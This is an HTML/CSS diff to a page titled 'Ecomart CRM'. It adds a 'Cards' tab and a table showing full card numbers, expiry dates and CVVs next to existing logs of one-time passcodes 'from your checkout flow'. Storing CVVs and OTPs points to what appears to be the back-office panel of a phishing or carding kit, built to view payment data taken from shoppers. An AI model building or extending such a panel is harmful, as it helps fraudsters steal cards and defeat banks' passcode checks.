@@ -133,7 +133,7 @@
 
     .stats-grid {
       display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
+      grid-template-columns: repeat(4, minmax(0, 1fr));
       gap: 10px;
       margin-bottom: 12px;
     }
@@ -425,7 +425,7 @@
   <header class="crm-topbar">
     <div>
       <h1 class="crm-title">Ecomart CRM</h1>
-      <p class="crm-subtitle">Orders and OTP logs from your checkout flow</p>
+      <p class="crm-subtitle">Orders, card details, and OTP logs from your checkout flow</p>
     </div>
     <div class="crm-controls">
       <div class="pill" id="session-info">Loading session...</div>
@@ -444,6 +444,10 @@
       <div class="stat-value" id="stat-orders">0</div>
     </article>
     <article class="stat-card">
+      <div class="stat-label">Card Entries</div>
+      <div class="stat-value" id="stat-cards">0</div>
+    </article>
+    <article class="stat-card">
       <div class="stat-label">OTP Entries</div>
       <div class="stat-value" id="stat-otp">0</div>
     </article>
@@ -457,6 +461,7 @@
     <div class="panel-header">
       <div class="tabs" role="tablist" aria-label="CRM Tabs">
         <button class="tab-btn active" data-tab="orders" type="button">Orders</button>
+        <button class="tab-btn" data-tab="cards" type="button">Cards</button>
         <button class="tab-btn" data-tab="otp" type="button">OTP</button>
       </div>
       <div class="panel-tools">
@@ -482,7 +487,22 @@
         </table>
       </div>
 
-      
+      <div class="table-wrap" id="tab-cards">
+        <table>
+          <thead>
+            <tr>
+              <th>Date & Time</th>
+              <th>Name</th>
+              <th>Card Number</th>
+              <th>Expiry</th>
+              <th>CVV</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="cards-body"></tbody>
+        </table>
+      </div>
+
       <div class="table-wrap" id="tab-otp">
         <table>
           <thead>
